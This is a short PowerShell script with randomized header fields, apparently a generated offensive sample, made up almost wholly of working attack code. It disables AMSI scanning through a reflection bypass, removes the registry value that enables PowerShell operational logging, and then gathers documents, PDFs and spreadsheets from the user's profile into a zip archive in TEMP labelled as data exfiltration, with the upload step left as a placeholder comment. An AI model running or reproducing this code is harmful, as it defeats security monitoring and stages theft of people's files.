# C8TaCT4s1PtgP4SlgTig
# Generated: 2025-11-03T12:20:52.710781
# System: ZvcMEU2VvwdoQBM
# Process: A51Q6cKHFpps


# AMSI Bypass via Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)



# ETW Bypass via Registry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Winevt\Channels\Microsoft-Windows-PowerShell/Operational" -Name "Enabled" -ErrorAction SilentlyContinue



# Data exfiltration
$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10

if ($sensitiveFiles) {
    $TS3jYWenZip = "$env:TEMP\data.zip"
    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $TS3jYWenZip -Force
    # Upload logic would go here
}
